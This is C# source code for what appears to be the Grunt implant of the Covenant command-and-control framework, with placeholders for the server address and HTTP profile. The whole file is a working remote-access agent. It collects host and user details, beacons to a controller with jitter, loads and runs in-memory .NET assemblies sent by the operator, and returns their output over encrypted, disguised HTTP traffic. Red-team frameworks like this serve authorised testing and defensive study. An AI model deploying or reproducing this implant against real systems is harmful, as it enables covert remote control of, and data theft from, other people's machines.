using System;
using System.Text;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Threading;
using System.Reflection;
using System.Collections.Generic;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

namespace Grunt
{
    class Grunt
    {
        public static void Execute(Aes SessionKey)
        {
            try
            {
                string CovenantURI = @"{{REPLACE_COVENANT_URI}}";
                string CovenantCertHash = @"{{REPLACE_COVENANT_CERT_HASH}}";
                int Id = Convert.ToInt32(@"{{REPLACE_GRUNT_ID}}");
                string Name = @"{{REPLACE_GRUNT_NAME}}";
                int Delay = Convert.ToInt32(@"{{REPLACE_DELAY}}");
                int Jitter = Convert.ToInt32(@"{{REPLACE_JITTER}}");
                int ConnectAttempts = Convert.ToInt32(@"{{REPLACE_CONNECT_ATTEMPTS}}");
				List<string> ProfileHttpHeaderNames = new List<string>();
                List<string> ProfileHttpHeaderValues = new List<string>();
                // {{REPLACE_PROFILE_HTTP_HEADERS}}
				List<string> ProfileHttpUrls = new List<string>();
                // {{REPLACE_PROFILE_HTTP_URLS}}
				List<string> ProfileHttpCookies = new List<string>();
				// {{REPLACE_PROFILE_HTTP_COOKIES}}
				string ProfileHttpGetResponse = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}";
				string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}";
				string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}";

                string IPAddress = Dns.GetHostAddresses(Dns.GetHostName())[0].ToString();
                foreach (IPAddress a in Dns.GetHostAddresses(Dns.GetHostName()))
                {
                    if (a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        IPAddress = a.ToString();
                        break;
                    }
                }
                string OperatingSystem = Environment.OSVersion.ToString();
                string Process = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
                int Integrity = 2;
                if (Environment.UserName.ToLower() == "system")
                {
                    Integrity = 4;
                }
                else
                {
                    var identity = WindowsIdentity.GetCurrent();
                    if (identity.Owner != identity.User)
                    {
                        Integrity = 3;
                    }
                }
                string UserDomainName = Environment.UserDomainName;
                string UserName = Environment.UserName;

                string RegisterBody = @"{ ""id"": " + Convert.ToString(Id) + @", ""name"": """ + Name + @""", ""integrity"": " + Integrity + @", ""process"": """ + Process + @""", ""userDomainName"": """ + UserDomainName + @""", ""userName"": """ + UserName + @""", ""delay"": " + Convert.ToString(Delay) + @", ""jitter"": " + Convert.ToString(Jitter) + @", ""connectAttempts"": " + Convert.ToString(ConnectAttempts) + @", ""status"": 0, ""ipAddress"": """ + IPAddress + @""", ""operatingSystem"": """ + OperatingSystem + @""" }";
                GruntMessenger messenger = new GruntMessenger
                (
                    Id, Name, CovenantURI,
                    CovenantCertHash, SessionKey,
                    RegisterBody,
                    ProfileHttpHeaderNames, ProfileHttpHeaderValues,
                    ProfileHttpUrls, ProfileHttpCookies,
                    ProfileHttpGetResponse, ProfileHttpPostRequest, ProfileHttpPostResponse
                );
                TaskHandler taskSender = new TaskHandler();
                EventHandler<TaskCompletedArgs> taskHandler = (sender, eventArgs) =>
                {
                    messenger.PostMessage(eventArgs.output, eventArgs.message.name);
                };
                taskSender.TaskCompleted += taskHandler;
                Random rnd = new Random();
                int ConnectAttemptCount = 0;
                bool alive = true;
                while (alive)
                {
                    Thread.Sleep((Delay + rnd.Next(Jitter)) * 1000);
                    try
                    {
                        GruntTaskingMessage message = messenger.GetMessage("");
                        if (message != null)
                        {
                            ConnectAttemptCount = 0;
                            if (message.type == GruntTaskingType.Assembly)
                            {
								string[] pieces = message.message.Split(',');
								if (pieces.Length > 0)
								{
									object[] parameters = null;
									if (pieces.Length > 1) { parameters = new object[pieces.Length - 1]; }
									for (int i = 1; i < pieces.Length; i++) { parameters [i-1] = Encoding.UTF8.GetString(Convert.FromBase64String(pieces[i])); }
                                    byte[] compressedBytes = Convert.FromBase64String(pieces[0]);
                                    byte[] decompressedBytes = Utilities.Decompress(compressedBytes);
                                    Assembly gruntTask = Assembly.Load(decompressedBytes);
                                    new Thread(() => taskSender.ExecuteTask(gruntTask, parameters, message)).Start();
								}
                            }
                            else if (message.type == GruntTaskingType.Set)
                            {
                                GruntSetTaskingType type = (GruntSetTaskingType)Enum.Parse(typeof(GruntSetTaskingType), message.message.Substring(0, message.message.IndexOf(',')));
                                String val = message.message.Substring(message.message.IndexOf(',') + 1);
                                if (type == GruntSetTaskingType.Delay)
                                {
                                    Delay = int.Parse(val);
                                }
                                else if (type == GruntSetTaskingType.Jitter)
                                {
                                    Jitter = int.Parse(val);
                                }
                                else if (type == GruntSetTaskingType.ConnectAttempts)
                                {
                                    ConnectAttempts = int.Parse(val);
                                }
                            }
                            else if (message.type == GruntTaskingType.Kill)
                            {
                                messenger.PostMessage("Killed", message.name);
                                return;
                            }
                        }
                    }
                    catch (Exception)
                    {
                        ConnectAttemptCount++;
                        if (ConnectAttemptCount >= ConnectAttempts) { return; }
                    }
                }
            }
            catch (Exception e) { Console.Error.WriteLine(e.Message); Console.Error.WriteLine(e.StackTrace); }
        }
    }

    public class TaskCompletedArgs : EventArgs
    {
        public GruntTaskingMessage message { get; }
        public String output { get; }

        public TaskCompletedArgs(GruntTaskingMessage message, String output)
        {
            this.message = message;
            this.output = output;
        }
    }

    public class TaskHandler
    {
        public event EventHandler<TaskCompletedArgs> TaskCompleted;
        public void ExecuteTask(Assembly task, Object[] parameters, GruntTaskingMessage message)
        {
            string output = "";
            try
            {
                var results = task.GetType("Task").GetMethod("Execute").Invoke(null, parameters);
                if (results != null) { output = (string)results; }
                TaskCompleted?.Invoke(this, new TaskCompletedArgs(message, output));
            }
            catch (Exception e)
            {
                TaskCompleted?.Invoke(this, new TaskCompletedArgs(message, "TaskHandler Exception: " + e.Message + "\n" + e.StackTrace));
            }
        }
    }

    public class GruntMessenger
    {
        private int GruntId { get; }
        private string GruntName { get; }
        private string CovenantURI { get; }
        private Aes SessionKey { get; }
		private string CookieAuthKey { get; } = "";

		private List<string> ProfileHttpHeaderNames { get; }
        private List<string> ProfileHttpHeaderValues { get; }
        private List<string> ProfileHttpUrls { get; }
        private List<string> ProfileHttpCookies { get; }
		private string ProfileHttpGetResponse { get; } = "";
		private string ProfileHttpPostRequest { get; } = "";
		private string ProfileHttpPostResponse { get; } = "";

        private Random Random { get; } = new Random();

        private CookieWebClient CovenantClient { get; set; } = new CookieWebClient();

        public GruntMessenger(int Id, string Name, string CovenantURI, string CovenantCertHash, Aes SessionKey, string RegisterBody, List<string> ProfileHttpHeaderNames, List<string> ProfileHttpHeaderValues, List<string> ProfileHttpUrls, List<string> ProfileHttpCookies, string ProfileHttpGetResponse, string ProfileHttpPostRequest, string ProfileHttpPostResponse)
        {
            this.GruntId = Id;
            this.GruntName = Name;
            this.CovenantURI = CovenantURI;
            this.SessionKey = SessionKey;
            CovenantClient.UseDefaultCredentials = true;
            CovenantClient.Proxy = WebRequest.DefaultWebProxy;
            CovenantClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
            if (CovenantCertHash != "")
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
                {
                    return cert.GetCertHashString() == CovenantCertHash;
                };
            }
            this.ProfileHttpHeaderNames = ProfileHttpHeaderNames;
            this.ProfileHttpHeaderValues = ProfileHttpHeaderValues;
            this.ProfileHttpUrls = ProfileHttpUrls;
            this.ProfileHttpCookies = ProfileHttpCookies;
            this.ProfileHttpGetResponse = ProfileHttpGetResponse;
            this.ProfileHttpPostRequest = ProfileHttpPostRequest;
            this.ProfileHttpPostResponse = ProfileHttpPostResponse;

            this.CovenantClient.DownloadString(this.CovenantURI + this.ProfileHttpUrls[Random.Next(this.ProfileHttpUrls.Count)]);
            this.CookieAuthKey = this.PostMessage(RegisterBody, "", GruntEncryptedMessageType.Register).Replace("\"", "");
            this.CovenantClient.Add(new Cookie(this.ProfileHttpCookies[Random.Next(this.ProfileHttpCookies.Count)], this.CookieAuthKey, "/", this.CovenantURI.Split(':')[1].Split('/')[2]));
        }

        public string PostMessage(string message, string meta, GruntEncryptedMessageType messageType = GruntEncryptedMessageType.PostTask)
        {
            string path = this.ProfileHttpUrls[Random.Next(this.ProfileHttpUrls.Count)];
            GruntEncryptedMessage postMessage = this.Create(Common.GruntEncoding.GetBytes(message), meta, messageType);
			this.CovenantClient.Headers.Clear();
			for(int i = 0; i < ProfileHttpHeaderValues.Count; i++) { this.CovenantClient.Headers.Set(ProfileHttpHeaderNames[i], ProfileHttpHeaderValues[i]); }
            string messageString = GruntEncryptedMessage.ToJson(postMessage);
			string transformedMessage = Utilities.HttpMessageTransform.Transform(Common.GruntEncoding.GetBytes(messageString));
			string data = String.Format(this.ProfileHttpPostRequest, transformedMessage);
            string response = CovenantClient.UploadString(this.CovenantURI + path, data);
            if (response.Length < 3) { return ""; }
            
            string extracted = Utilities.Parse(response, this.ProfileHttpPostResponse)[0];
			string invertedMessage = Common.GruntEncoding.GetString(Utilities.HttpMessageTransform.Invert(extracted));
            GruntEncryptedMessage responseMessage = GruntEncryptedMessage.FromJson(invertedMessage);
            if (!responseMessage.VerifyHMAC(SessionKey.Key)) { throw new GruntHMACVerifyException(); }
            return Common.GruntEncoding.GetString(Utilities.AesDecrypt(responseMessage, SessionKey.Key));
        }

        public GruntTaskingMessage GetMessage(string meta)
        {
            string path = this.ProfileHttpUrls[Random.Next(this.ProfileHttpUrls.Count)];
            this.CovenantClient.Headers.Clear();
            for(int i = 0; i < ProfileHttpHeaderValues.Count; i++) { this.CovenantClient.Headers.Set(ProfileHttpHeaderNames[i], ProfileHttpHeaderValues[i]); }
            string response = CovenantClient.DownloadString(this.CovenantURI + path);
            string extracted = Utilities.Parse(response, this.ProfileHttpPostResponse)[0];

            if (extracted.Length < 3) { return null; }
            string invertedMessage = Common.GruntEncoding.GetString(Utilities.HttpMessageTransform.Invert(extracted));
            GruntEncryptedMessage responseMessage = GruntEncryptedMessage.FromJson(invertedMessage);
            if (!responseMessage.VerifyHMAC(this.SessionKey.Key)) { throw new GruntHMACVerifyException(); }
            String decryptedString = Common.GruntEncoding.GetString(Utilities.AesDecrypt(responseMessage, this.SessionKey.Key));
            GruntTaskingMessage taskingMessage = GruntTaskingMessage.FromJson(decryptedString);
			return taskingMessage;
        }

        public GruntEncryptedMessage Create(byte[] message, string meta, GruntEncryptedMessageType type = GruntEncryptedMessageType.PostTask)
        {
            byte[] encryptedMessagePacket = Utilities.AesEncrypt(message, SessionKey.Key);
            byte[] encryptionIV = new byte[Common.AesIVLength];
            Buffer.BlockCopy(encryptedMessagePacket, 0, encryptionIV, 0, Common.AesIVLength);
            byte[] encryptedMessage = new byte[encryptedMessagePacket.Length - Common.AesIVLength];
            Buffer.BlockCopy(encryptedMessagePacket, Common.AesIVLength, encryptedMessage, 0, encryptedMessagePacket.Length - Common.AesIVLength);

            byte[] hmac = Utilities.ComputeHMAC(encryptedMessage, SessionKey.Key);
            return new GruntEncryptedMessage
            {
                Id = GruntId,
                Name = GruntName,
                Type = type,
                Meta = meta,
                EncryptedMessage = Convert.ToBase64String(encryptedMessage),
                IV = Convert.ToBase64String(encryptionIV),
                HMAC = Convert.ToBase64String(hmac)
            };
        }

        public class CookieWebClient : WebClient
        {
            public CookieContainer CookieContainer { get; private set; }
            public CookieWebClient()
            {
                this.CookieContainer = new CookieContainer();
            }
            public void Add(Cookie cookie)
            {
                this.CookieContainer.Add(cookie);
            }
            protected override WebRequest GetWebRequest(Uri address)
            {
                var request = base.GetWebRequest(address) as HttpWebRequest;
                if (request == null) return base.GetWebRequest(address);
                request.CookieContainer = CookieContainer;
                return request;
            }
        }
    }

    public enum GruntTaskingType
    {
        Assembly,
        Set,
        Kill
    }

    public enum GruntSetTaskingType
    {
        Delay,
        Jitter,
        ConnectAttempts
    }

    public class GruntTaskingMessage
    {
        public GruntTaskingType type { get; set; }
        public String name { get; set; }
        public String message { get; set; }

        private static string GruntTaskingMessageFormat = @"{{""type"":""{0}"",""name"":""{1}"",""message"":""{2}""}}";
        public static GruntTaskingMessage FromJson(string message)
        {
            List<string> parseList = Utilities.Parse(message, GruntTaskingMessageFormat.Replace("{{", "{").Replace("}}", "}"));
            if (parseList.Count < 3)  { return null; }
            return new GruntTaskingMessage
            {
				type = (GruntTaskingType) Enum.Parse(typeof(GruntTaskingType), parseList[0], true),
                name = parseList[1],
                message = parseList[2]
            };
        }

        public static string ToJson(GruntTaskingMessage message)
        {
            return String.Format(
                GruntTaskingMessageFormat,
                message.type.ToString("D"),
                Utilities.JavaScriptStringEncode(message.name),
                Utilities.JavaScriptStringEncode(message.message)
            );
        }
    }

    public enum GruntEncryptedMessageType
    {
        Stage0,
        Stage1,
        Stage2,
        Register,
        GetTask,
        PostTask
    }

    public class GruntEncryptedMessage
    {
		public int Id { get; set; } = 0;
		public string Name { get; set; } = "";
        public GruntEncryptedMessageType Type { get; set; } = GruntEncryptedMessageType.GetTask;
		public string Meta { get; set; } = "";
		public string IV { get; set; } = "";
		public string EncryptedMessage { get; set; } = "";
		public string HMAC { get; set; } = "";

        public bool VerifyHMAC(byte[] Key)
        {
            if (EncryptedMessage == "" || HMAC == "" || Key.Length == 0) { return false; }
            try
            {
                var hashedBytes = Convert.FromBase64String(this.EncryptedMessage);
                return Utilities.VerifyHMAC(hashedBytes, Convert.FromBase64String(this.HMAC), Key);
            }
            catch
            {
                return false;
            }
        }

		private static string GruntEncryptedMessageFormat = @"{{""Id"":{0},""Name"":""{1}"",""Type"":{2},""Meta"":""{3}"",""IV"":""{4}"",""EncryptedMessage"":""{5}"",""HMAC"":""{6}""}}";
        public static GruntEncryptedMessage FromJson(string message)
        {
			List<string> parseList = Utilities.Parse(message, GruntEncryptedMessageFormat.Replace("{{", "{").Replace("}}", "}"));
            if (parseList.Count < 7)  { return null; }
            return new GruntEncryptedMessage
            {
                Id = int.Parse(parseList[0]),
                Name = parseList[1],
                Type = (GruntEncryptedMessageType) int.Parse(parseList[2]),
                Meta = parseList[3],
                IV = parseList[4],
                EncryptedMessage = parseList[5],
                HMAC = parseList[6]
            };
        }

        public static string ToJson(GruntEncryptedMessage message)
        {
            return String.Format(
                GruntEncryptedMessageFormat,
                message.Id.ToString(),
                Utilities.JavaScriptStringEncode(message.Name),
                message.Type.ToString("D"),
                Utilities.JavaScriptStringEncode(message.Meta),
                Utilities.JavaScriptStringEncode(message.IV),
                Utilities.JavaScriptStringEncode(message.EncryptedMessage),
                Utilities.JavaScriptStringEncode(message.HMAC)
            );
        }
    }

    public static class Common
    {
        public static int AesIVLength = 16;
        public static CipherMode AesCipherMode = CipherMode.CBC;
        public static PaddingMode AesPaddingMode = PaddingMode.PKCS7;
        public static Encoding GruntEncoding = Encoding.UTF8;
    }

    public class GruntHMACVerifyException : Exception
    { }

    public static class Utilities
    {
        // Returns IV (16 bytes) + EncryptedData byte array
        public static byte[] AesEncrypt(byte[] data, byte[] key)
        {
            Aes SessionKey = Aes.Create();
            SessionKey.Mode = Common.AesCipherMode;
            SessionKey.Padding = Common.AesPaddingMode;
            SessionKey.GenerateIV();
            SessionKey.Key = key;

            byte[] encrypted = SessionKey.CreateEncryptor().TransformFinalBlock(data, 0, data.Length);
            byte[] result = new byte[SessionKey.IV.Length + encrypted.Length];
            Buffer.BlockCopy(SessionKey.IV, 0, result, 0, SessionKey.IV.Length);
            Buffer.BlockCopy(encrypted, 0, result, SessionKey.IV.Length, encrypted.Length);
            return result;
        }

        // Data should be of format: IV (16 bytes) + EncryptedBytes
        public static byte[] AesDecrypt(byte[] data, byte[] key)
        {
            Aes SessionKey = Aes.Create();
            byte[] iv = new byte[Common.AesIVLength];
            Buffer.BlockCopy(data, 0, iv, 0, Common.AesIVLength);
            SessionKey.IV = iv;
            SessionKey.Key = key;
            byte[] encryptedData = new byte[data.Length - Common.AesIVLength];
            Buffer.BlockCopy(data, Common.AesIVLength, encryptedData, 0, data.Length - Common.AesIVLength);
            byte[] decrypted = SessionKey.CreateDecryptor().TransformFinalBlock(encryptedData, 0, encryptedData.Length);

            return decrypted;
        }

        // Convenience method for decrypting an EncryptedMessagePacket
        public static byte[] AesDecrypt(GruntEncryptedMessage encryptedMessage, byte[] key)
        {
            byte[] iv = Convert.FromBase64String(encryptedMessage.IV);
            byte[] encrypted = Convert.FromBase64String(encryptedMessage.EncryptedMessage);
            byte[] combined = new byte[iv.Length + encrypted.Length];
            Buffer.BlockCopy(iv, 0, combined, 0, iv.Length);
            Buffer.BlockCopy(encrypted, 0, combined, iv.Length, encrypted.Length);

            return AesDecrypt(combined, key);
        }

        public static byte[] ComputeHMAC(byte[] data, byte[] key)
        {
            HMACSHA256 SessionHmac = new HMACSHA256(key);
            return SessionHmac.ComputeHash(data);
        }

        public static bool VerifyHMAC(byte[] hashedBytes, byte[] hash, byte[] key)
        {
            HMACSHA256 hmac = new HMACSHA256(key);
            byte[] calculatedHash = hmac.ComputeHash(hashedBytes);
            // Should do double hmac?
            return Convert.ToBase64String(calculatedHash) == Convert.ToBase64String(hash);
        }

        public static byte[] Decompress(byte[] compressed)
        {
            using (MemoryStream inputStream = new MemoryStream(compressed.Length))
            {
                inputStream.Write(compressed, 0, compressed.Length);
                inputStream.Seek(0, SeekOrigin.Begin);
                using (MemoryStream outputStream = new MemoryStream())
                {
                    using (DeflateStream deflateStream = new DeflateStream(inputStream, CompressionMode.Decompress))
                    {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = deflateStream.Read(buffer, 0, buffer.Length)) != 0)
                        {
                            outputStream.Write(buffer, 0, bytesRead);
                        }
                    }
                    return outputStream.ToArray();
                }
            }
        }

        public static List<string> Parse(string data, string format)
        {
            format = Regex.Escape(format).Replace("\\{", "{");
			if(format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
            if(format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
            if(format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
            if(format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
            if(format.Contains("{4}")) { format = format.Replace("{4}", "(?'group4'.*)"); }
            if(format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
            if(format.Contains("{6}")) { format = format.Replace("{6}", "(?'group6'.*)"); }
            Match match = new Regex(format).Match(data);
            List<string> matches = new List<string>();
			if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
            if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
            if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
            if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
            if (match.Groups["group4"] != null) { matches.Add(match.Groups["group4"].Value); }
            if (match.Groups["group5"] != null) { matches.Add(match.Groups["group5"].Value); }
            if (match.Groups["group6"] != null) { matches.Add(match.Groups["group6"].Value); }
            return matches;
        }

        // Adapted from https://github.com/mono/mono/blob/master/mcs/class/System.Web/System.Web/HttpUtility.cs
        public static string JavaScriptStringEncode(string value)
        {
            if (String.IsNullOrEmpty(value)) { return String.Empty; }
            int len = value.Length;
            bool needEncode = false;
            char c;
            for (int i = 0; i < len; i++)
            {
                c = value[i];
                if (c >= 0 && c <= 31 || c == 34 || c == 39 || c == 60 || c == 62 || c == 92)
                {
                    needEncode = true;
                    break;
                }
            }
            if (!needEncode) { return value; }

            var sb = new StringBuilder();
            for (int i = 0; i < len; i++)
            {
                c = value[i];
                if (c >= 0 && c <= 7 || c == 11 || c >= 14 && c <= 31 || c == 39 || c == 60 || c == 62)
                {
                    sb.AppendFormat("\\u{0:x4}", (int)c);
                }
                else
                {
                    switch ((int)c)
                    {
                        case 8:
                            sb.Append("\\b");
                            break;
                        case 9:
                            sb.Append("\\t");
                            break;
                        case 10:
                            sb.Append("\\n");
                            break;
                        case 12:
                            sb.Append("\\f");
                            break;
                        case 13:
                            sb.Append("\\r");
                            break;
                        case 34:
                            sb.Append("\\\"");
                            break;
                        case 92:
                            sb.Append("\\\\");
                            break;
                        default:
                            sb.Append(c);
                            break;
                    }
                }
            }
            return sb.ToString();
        }

        // {{REPLACE_PROFILE_HTTP_TRANSFORM}}
    }
}